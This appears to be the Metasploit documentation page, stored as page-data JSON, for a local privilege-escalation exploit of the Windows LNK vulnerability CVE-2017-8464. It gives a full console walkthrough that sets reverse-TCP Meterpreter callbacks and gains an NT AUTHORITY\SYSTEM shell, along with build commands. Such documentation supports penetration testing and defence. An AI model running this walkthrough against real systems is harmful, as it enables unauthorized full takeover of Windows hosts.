{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/cve_2017_8464_lnk_lpe","result":{"data":{"moduleMetadataJson":{"id":"39ca517c-c645-54e8-bbba-ca6e740f6421","name":"LNK Code Execution Vulnerability","fullname":"exploit/windows/local/cve_2017_8464_lnk_lpe","description":"This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK)\n          that contain a dynamic icon, loaded from a malicious DLL.\n\n          This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is\n          similar except an additional SpecialFolderDataBlock is included. The folder ID set\n          in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass\n          the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary\n          DLL file.\n\n          The PATH option must be an absolute path to a writeable directory which is indexed for\n          searching. If no PATH is specified, the module defaults to %USERPROFILE%.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/cve_2017_8464_lnk_lpe","documentationSlug":"/modules/documentation/exploit/windows/local/cve_2017_8464_lnk_lpe"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module is a Windows local exploit version of the existing file\nformat module for CVE-2017-8464. The module works by dropping the\nspecially crafted LNK file and DLL to disk, which causes\n<code class=\"language-text\">SearchProtocolHost.exe</code> to parse the LNK file and thus load the DLL via\nthe vulnerability. Due to <code class=\"language-text\">SearchProtocolHost.exe</code> running as SYSTEM,\nthis can be used to elevate privileges.</p>\n<p>The original DLL template needed some significant reworking to make it\ncompatible for execution within <code class=\"language-text\">SearchProtocolHost.exe</code>. The payload\nwas originally failing in the hollowed child <code class=\"language-text\">rundll32.exe</code> process with\na denied error from winsock. This was addressed by checking if the process\nwhich loaded the crafted DLL is <code class=\"language-text\">SearchProtocolHost.exe</code> and when it is,\nit opens the token of another SYSTEM process and passes it to\n<code class=\"language-text\">CreateProcessAsUser</code> for the payload to work. When the DLL is loaded\ninto another process or is not running as SYSTEM, this step is skipped\nand <code class=\"language-text\">NULL</code> is passed as the token.</p>\n<p>Finally a thread is spawned to keep a module reference and monitor the\nchild process. This is for synchronization to prevent the payload from\nbeing executed in rapid succession from a single exploitation attempt.\nThe mutex was also updated to the constant of <code class=\"language-text\">MUTEX!!!</code> to leverage\nMetasploit's builtin mutex name randomization, which ensures that a name\nis unique per module run but not globally unique.</p>\n<h2 id=\"vulnerable-systems\" style=\"position:relative;\"><a href=\"#vulnerable-systems\" aria-label=\"vulnerable systems permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Systems</h2>\n<p>Tested and works on\nWindows 7x64 SP0\nWindows 7x64 SP1\nWindows 8x64\nWindows 8.1x64\nWindows 10x64 Build 1511\nWindows 10x64 Build 1607\nWindows 10x64 Build 1703</p>\n<h2 id=\"running-example\" style=\"position:relative;\"><a href=\"#running-example\" aria-label=\"running example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Running Example:</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt; use exploit/multi/handler\n&gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\n&gt; set LHOST 192.168.135.112\nLHOST =&gt; 192.168.135.112\n&gt; set LPORT 30001\nLPORT =&gt; 30001\n&gt; show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.135.112  yes       The listen address\n   LPORT     30001            yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\n[*] &gt; Ruby Code (13 bytes)\n&gt; run -z\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.135.112:30001\n[*] Sending stage (205379 bytes) to 192.168.134.133\n[*] Meterpreter session 1 opened (192.168.135.112:30001 -&gt; 192.168.134.133:49178) at 2017-11-06 10:22:02 -0800\n&gt; sysinfo\nComputer        : WIN7X64-SP0\nOS              : Windows 7 (Build 7600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 4\nMeterpreter     : x64/windows\n&gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type                     Information                        Connection\n  --  ----                     -----------                        ----------\n  1   meterpreter x64/windows  WIN7X64-SP0\\msfuser @ WIN7X64-SP0  192.168.135.112:30001 -&gt; 192.168.134.133:49178 (192.168.134.133)\n\n&gt; use exploit/windows/local/cve_2017_8464_lnk_lpe\n&gt; set session 1\nsession =&gt; 1\n&gt; set target 0\ntarget =&gt; 0\n&gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\n&gt; set lhost 192.168.135.112\nlhost =&gt; 192.168.135.112\n&gt; set lport 30002\nlport =&gt; 30002\n&gt; set verbose true\nverbose =&gt; true\n&gt; show options\n\nModule options (exploit/windows/local/cve_2017_8464_lnk_lpe):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   DLLNAME                    no        The DLL file containing the payload\n   FILENAME                   no        The LNK file\n   PATH                       no        An explicit path to where the files should be written to\n   SESSION   1                yes       The session to run this module on.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.135.112  yes       The listen address\n   LPORT     30002            yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows x64\n\n\n&gt; run -j\n[*] Exploit running as background job 1.\n[*] Started reverse TCP handler on 192.168.135.112:30002\n[*] Generating LNK file to load: C:\\Users\\msfuser\\QtGyQHZpWvmzjdsn.dll\n[*] Sending stage (205379 bytes) to 192.168.134.133\n[*] Meterpreter session 2 opened (192.168.135.112:30002 -&gt; 192.168.134.133:49179) at 2017-11-06 10:23:03 -0800\n[*] Waiting 15s before file cleanup...\n[+] Deleted C:\\Users\\msfuser\\HADoIQMbEQDpbbRn.lnk\n[+] Deleted C:\\Users\\msfuser\\QtGyQHZpWvmzjdsn.dll\n&gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type                     Information                        Connection\n  --  ----                     -----------                        ----------\n  1   meterpreter x64/windows  WIN7X64-SP0\\msfuser @ WIN7X64-SP0  192.168.135.112:30001 -&gt; 192.168.134.133:49178 (192.168.134.133)\n  2   meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ WIN7X64-SP0  192.168.135.112:30002 -&gt; 192.168.134.133:49179 (192.168.134.133)\n\n&gt; getuid\nServer username: WIN7X64-SP0\\msfuser\nServer username: NT AUTHORITY\\SYSTEM\n&gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n&gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n&gt; exit -y</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"compiling-instructions\" style=\"position:relative;\"><a href=\"#compiling-instructions\" aria-label=\"compiling instructions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Compiling instructions</h2>\n<p><code class=\"language-text\">cd ./external/source/exploits/cve-2017-8464</code>\n<code class=\"language-text\">./build.sh</code></p>\n<p>(Requires <code class=\"language-text\">mingw-w64</code> package)</p>"}}},"pageContext":{"id":"39ca517c-c645-54e8-bbba-ca6e740f6421"}}}